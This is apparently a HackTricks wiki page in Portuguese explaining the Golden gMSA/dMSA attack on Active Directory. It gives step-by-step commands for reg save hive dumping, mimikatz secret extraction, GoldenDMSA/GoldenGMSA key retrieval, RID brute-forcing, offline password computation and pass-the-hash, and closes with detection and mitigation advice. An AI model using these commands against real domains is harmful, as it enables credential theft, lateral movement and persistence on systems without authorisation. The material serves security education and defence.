# Golden gMSA/dMSA Attack (Derivação Offline de Senhas de Managed Service Accounts)

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Windows Managed Service Accounts (MSA) são principals especiais projetados para executar serviços sem a necessidade de gerenciar manualmente suas senhas.
Existem duas variantes principais:

1. **gMSA** – group Managed Service Account – pode ser usada em múltiplos hosts autorizados em seu atributo `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – a sucessora (em preview) da gMSA, baseada na mesma criptografia, mas permitindo cenários de delegação mais granulares.

Para ambas as variantes, a **senha não é armazenada** em cada Domain Controller (DC) como um NT-hash comum. Em vez disso, cada DC pode **derivar** a senha atual on-the-fly a partir de:

* A **KDS Root Key** de toda a forest (`KRBTGT\KDS`) – secret nomeado com um GUID gerado aleatoriamente, replicado para cada DC no container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* O **SID** da conta-alvo.
* Um **ManagedPasswordID** por conta (GUID), encontrado no atributo `msDS-ManagedPasswordId`.

A derivação é: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 bytes finalmente **codificado em base64** e armazenado no atributo `msDS-ManagedPassword`.
Nenhum tráfego Kerberos ou interação com o domínio é necessário durante o uso normal da senha – um host membro deriva a senha localmente, desde que conheça as três entradas.

## Golden gMSA / Golden dMSA Attack

Se um atacante conseguir obter todas as três entradas **offline**, poderá calcular **senhas atuais e futuras válidas** para qualquer gMSA/dMSA na forest sem tocar novamente no DC, contornando:<sup>[[1]](#references)[[2]](#references)</sup>

* Auditoria de leitura LDAP
* Intervalos de alteração de senha (as senhas podem ser pré-computadas)

Isso é análogo a um *Golden Ticket* para contas de serviço.<sup>[[1]](#references)[[2]](#references)</sup>

### Pré-requisitos

1. **Comprometimento no nível da forest** de **um DC** (ou Enterprise Admin), ou acesso `SYSTEM` a um dos DCs na forest.
2. Capacidade de enumerar contas de serviço (leitura LDAP / RID brute-force).
3. Workstation x64 com .NET ≥ 4.7.2 para executar [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ou código equivalente.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Fase 1 – Extrair a KDS Root Key

Extraia de qualquer DC (Volume Shadow Copy / hives SAM+SECURITY brutos ou secrets remotos):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
A string base64 rotulada como `RootKey` (nome GUID) é necessária nas etapas posteriores.<sup>[[1]](#references)[[2]](#references)</sup>

##### Fase 2 – Enumerar objetos gMSA / dMSA

Recupere pelo menos `sAMAccountName`, `objectSid` e `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modos auxiliares:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Guess / Discover o ManagedPasswordID (quando ausente)

Algumas implantações *removem* `msDS-ManagedPasswordId` de leituras protegidas por ACL.
Como o GUID tem 128 bits, um bruteforce ingênuo é inviável, mas:

1. Os primeiros **32 bits = tempo Unix epoch** da criação da conta (com resolução de minutos).
2. Seguidos por 96 bits aleatórios.

Portanto, uma **wordlist restrita por conta** (± algumas horas) é realista.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
A ferramenta calcula candidate passwords e compara seu blob base64 com o atributo `msDS-ManagedPassword` real – a correspondência revela o GUID correto.

##### Fase 4 – Offline Password Computation & Conversion

Quando o ManagedPasswordID for conhecido, a senha válida estará a um comando de distância:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Os hashes resultantes podem ser injetados com **mimikatz** (`sekurlsa::pth`) ou **Rubeus** para abuso de Kerberos, permitindo **lateral movement** e **persistence** furtivos.

## Detecção e Mitigação

* Restrinja os recursos de **backup do DC e leitura de hives do registro** aos administradores Tier-0.
* Monitore a criação do **Directory Services Restore Mode (DSRM)** ou do **Volume Shadow Copy** nos DCs.
* Audite leituras / alterações em `CN=Master Root Keys,…` e nos sinalizadores `userAccountControl` de contas de serviço.
* Detecte gravações incomuns de senhas em **base64** ou a reutilização repentina de senhas de serviço em vários hosts.
* Considere converter gMSAs com privilégios elevados em **contas de serviço clássicas**, com rotações aleatórias regulares, quando o isolamento Tier-0 não for possível.

## Ferramentas

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementação de referência usada nesta página.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementação de referência usada nesta página.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket usando chaves AES derivadas.

## Referências

- [1] [Golden dMSA – bypass de autenticação para Managed Service Accounts delegadas](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Contas de ataque do Active Directory gMSA](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Repositório GoldenDMSA no GitHub da Semperis](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
